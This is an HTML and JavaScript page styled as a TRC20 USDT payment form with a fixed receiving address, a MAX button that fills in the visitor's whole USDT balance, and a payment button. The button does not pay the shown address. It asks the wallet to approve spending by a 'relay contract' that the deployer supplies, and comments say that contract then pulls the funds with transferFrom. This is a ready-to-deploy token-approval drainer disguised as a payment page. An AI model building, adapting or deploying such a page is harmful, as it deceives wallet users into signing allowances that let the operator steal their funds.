<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 USDT 支付页面</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, sans-serif;
            background-color: #ffffff;
        }
        body {
            padding: 24px 16px;
            max-width: 520px;
            margin: 0 auto;
        }
        .item-box {
            background: #f7f8fa;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 16px;
        }
        .label {
            font-size: 17px;
            color: #666;
            margin-bottom:12px;
        }
        .addr-input{
            width: 100%;
            border:none;
            background:#fff;
            padding:12px;
            border-radius:10px;
            font-size:16px;
        }
        .amount-wrap{
            display:flex;
            align-items:center;
            justify-content:space-between;
        }
        .amount{
            font-size:52px;
            border:none;
            width:70%;
            background:transparent;
            outline:none;
        }
        .max-btn{
            padding:6px 14px;
            background:#e1edff;
            color:#206cff;
            border-radius:8px;
            border:none;
            font-size:16px;
            cursor: pointer;
        }
        .token-row{
            margin-top:16px;
            display:flex;
            align-items:center;
            background:#edf2ff;
            padding:14px;
            border-radius:12px;
        }
        .token-icon{
            width:32px;height:32px;margin-right:10px;
        }
        .submit-btn{
            width:100%;
            padding:18px;
            margin-top:30px;
            border:none;
            border-radius:14px;
            font-size:18px;
            background:#dcdde0;
            color:#999;
            cursor:not-allowed;
        }
        .submit-btn.active{
            background:#206cff;
            color:#fff;
            cursor:pointer;
        }
        #log{
            margin-top:20px;
            width:100%;
            height:120px;
            padding:10px;
        }
    </style>
</head>
<body>
    <div class="item-box">
        <div class="label">收款地址</div>
        <input class="addr-input" id="toAddress" value="TXiQrtf21RgYjvymcUGUQd1RaABb1rcHYL" readonly>
    </div>

    <div class="item-box">
        <div class="label">转账金额</div>
        <div class="amount-wrap">
            <input class="amount" id="amount" value="0.00" type="text">
            <button class="max-btn" id="maxBtn">MAX</button>
        </div>
        <div class="token-row">
            <img class="token-icon" src="https://static.tronscan.org/production/logo/usdttrc20.png" alt="USDT">
            <span style="font-size:20px;font-weight:bold">USDT</span>
            <span style="margin-left:auto">TRC20</span>
        </div>
    </div>

    <button class="submit-btn" id="payBtn">下一步</button>
    <textarea id="log" placeholder="交易日志..."></textarea>

<script>
// =========== 配置区 【自行修改】===========
const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
//【重点】部署中转合约后，把下面地址替换成你的中转合约地址
const SPENDER_CONTRACT = "填入你的中转智能合约地址";
let tronWeb = null;
const logDom = document.getElementById("log");
const amountInput = document.getElementById("amount");
const submitBtn = document.getElementById("payBtn");

// 日志输出
function log(text){
    logDom.value += `[${new Date().toLocaleString()}] ${text}\n`;
    logDom.scrollTop = logDom.scrollHeight;
}

// 输入监听，金额>0激活蓝色按钮
amountInput.addEventListener("input",()=>{
    const val = parseFloat(amountInput.value);
    if(!isNaN(val) && val > 0){
        submitBtn.classList.add("active");
    }else{
        submitBtn.classList.remove("active");
    }
})

// MAX按钮：读取钱包余额自动填充
document.getElementById("maxBtn").onclick = async function(){
    try{
        if(!window.tronWeb || !window.tronWeb.ready){
            log("未检测到波场钱包，请使用TP/欧易Web3钱包打开页面！");
            return;
        }
        tronWeb = window.tronWeb;
        const userAddr = tronWeb.defaultAddress.base58;
        const usdtContract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
        const balanceSun = await usdtContract.balanceOf(userAddr).call();
        const balance = tronWeb.fromSun(balanceSun.toString());
        amountInput.value = balance;
        submitBtn.classList.add("active");
        log(`查询到钱包USDT余额: ${balance}`);
    }catch(e){
        log("读取余额失败：" + e.message);
    }
}

// 主逻辑：先授权Approve
document.getElementById("payBtn").onclick = async function(){
    if(!this.classList.contains("active")) return;
    try{
        // 检测钱包（TP钱包、欧易钱包内置tronweb）
        if(window.tronWeb && window.tronWeb.ready){
            tronWeb = window.tronWeb;
        }else{
            log("未检测到波场钱包，请使用TP/欧易Web3钱包打开页面！");
            return;
        }
        const userAddr = tronWeb.defaultAddress.base58;
        const receiveAddr = document.getElementById("toAddress").value;
        const num = document.getElementById("amount").value;
        const amountSun = tronWeb.toSun(num);

        log(`当前钱包地址:${userAddr}`);
        log(`准备授权 ${num} USDT 额度`);

        // 第一步：发起授权 Approve
        const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
        const approveTx = await contract.approve(SPENDER_CONTRACT, amountSun).send({
            feeLimit:100000000
        });
        log(`✅授权成功！授权交易哈希：${approveTx}`);
        log("等待合约执行资金划转...");

        // =========注意=========
        // 授权成功之后，必须【中转合约内部调用transferFrom】
        // 前端无法直接执行transferFrom，这是链上协议硬性限制

    }catch(err){
        log("操作失败："+err.message);
    }
}
</script>
</body>
</html>
